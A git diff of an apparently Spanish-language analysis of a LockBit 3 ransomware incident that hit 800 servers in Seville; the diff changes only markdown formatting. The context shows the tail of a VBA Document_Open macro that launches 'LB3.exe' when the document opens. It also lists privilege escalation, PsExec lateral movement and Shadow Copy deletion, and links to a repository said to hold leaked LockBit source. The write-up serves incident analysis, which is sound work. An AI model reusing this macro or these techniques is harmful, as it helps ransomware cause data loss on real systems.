@@ -53,13 +53,14 @@ Sub Document_Open()
     ' 3. Ejecución del Ransomware
     CreateObject("WScript.Shell").Run "c:\temp\LB3.exe"
 End Sub
+```
 
 #### Fase de Ejecución e Impacto
 Una vez el LB3.exe se ejecuta en la máquina de la víctima (Paciente Cero):
-1. Escalada de Privilegios: El malware intenta obtener permisos de SYSTEM.
+1. **Escalada de Privilegios**: El malware intenta obtener permisos de SYSTEM.
 
-2- Movimiento Lateral: Utiliza herramientas como PsExec para propagarse por la red (explicando la infección de 800 servidores en Sevilla).
+2. **Movimiento Lateral**: Utiliza herramientas como PsExec para propagarse por la red (explicando la infección de 800 servidores en Sevilla).
 
-3. Impacto Irreversible: Elimina las Shadow Copies (copias de seguridad de volumen) para impedir la restauración simple.
+3. **Impacto Irreversible**: Elimina las Shadow Copies (copias de seguridad de volumen) para impedir la restauración simple.
 
 [Fuente del repositorio filtardo](https://github.com/Tennessene/LockBit)
